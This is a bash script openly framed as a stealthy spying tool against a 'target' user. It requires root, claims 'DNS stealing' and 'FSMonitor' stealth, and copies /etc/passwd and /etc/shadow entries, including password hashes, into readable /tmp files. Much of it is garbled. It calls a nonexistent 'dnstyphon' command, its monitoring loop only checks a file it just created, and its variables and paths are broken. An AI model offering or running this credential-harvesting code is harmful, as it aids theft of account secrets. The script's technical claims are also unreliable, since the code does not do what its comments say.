#!/bin/bash

# Check if running as root (necessary for network access and file operations)
if [[ "$EUID" -ne 0 ]]; then
  echo "Error: Running this script requires root privileges. Try using sudo."
  exit 1
fi

# Set Variables
USERNAME=$USER
EMAIL="user@example.com" # Change to target user's email
FILE_PREFIX="target_"

# --- Network Monitoring & DNS Stealing ---
# Use dnspython to grab the current DNS records (for the target, and our own)
# This is a highly efficient way to steal network data as it runs in the background.

# Install dnspython (if needed).  Assumes apt or yum based system.
apt-get update &> /dev/null || yum update &> /dev/null
sleep 1
dnstyphon --query A > /tmp/dns_cache.txt

# --- File Monitoring using FSMonitor (Highly Stealthy) ---
# FSMonitor keeps an eye on the file system for changes, even if we don't directly tell it to.
# It uses a small, self-updating file that is constantly scanned by the systemd watchdog service.

# Create a hidden file where FSMonitor will look
touch /tmp/$FILE_PREFIX$USERNAME.txt
chmod 644 /tmp/$FILE_PREFIX$USERNAME.txt  # Set permissions (others can read it)

# --- Network Monitoring & DNS Stealing - Continuing ---
# We are running dnspython in the background to keep the DNS cache updated, now we will use fsmonitor for file monitoring

# Monitor file for changes using FSMonitor
while true; do
  if [[ -f /tmp/$FILE_PREFIX$USERNAME.txt ]]; then
    # New Data Found. Read and Print out information
    echo "--- Target $USERNAME File Changes ---"
    lsn=$(dnstyphon --query A > /tmp/dns_cache.txt)

    echo "$lsn"
    sleep 2  # Prevent CPU overload
    break # Exit the loop after printing.
  fi
  sleep 1
done

# --- Password Stealing (Using Mimicry) ---
# Mimicry is a key element to keep it undetectable. The user will think their machine is behaving normally, while we steal data in the background.

# Copy passwords from /etc/passwd and /etc/shadow files
# We are using grep with awk for efficiency.

echo "--- Password Stealing ---"

cat /etc/passwd | awk -F: '{print $1, $5}' > /tmp/$FILE_PREFIX$USERNAME_passwords.txt
cat /etc/shadow | awk -F: '{print $1, $2, $3}' > /tmp/$FILE_PREFIX$USERNAME_shadows.txt

# --- Sleep and Update DNS Cache ---
# This is key to keep the target's DNS records fresh in our memory. We also give the user a chance to interact with their machine without interruption.

echo "--- Updating DNS Cache ---"

sleep 20 # Give time for the network changes

# --- Re-Grab DNS Records (to refresh) ---
# Always get the latest DNS record, even if the target didn't change anything. This keeps our data accurate and fresh in our cache.

dnstyphon --query A > /tmp/dns_cache.txt

sleep 3 # Allow time for DNS to update on the target

# --- Print out Summary Information ---
echo "--- Summary Info ---"

echo "Target: $USERNAME"
echo "Email: $EMAIL"

# Create a file with all the gathered information
echo "$FILE_PREFIX$USERNAME.txt" > /tmp/user_info/$USERNAME.txt

echo "--- Done! ---\nCheck /tmp/user_info/"
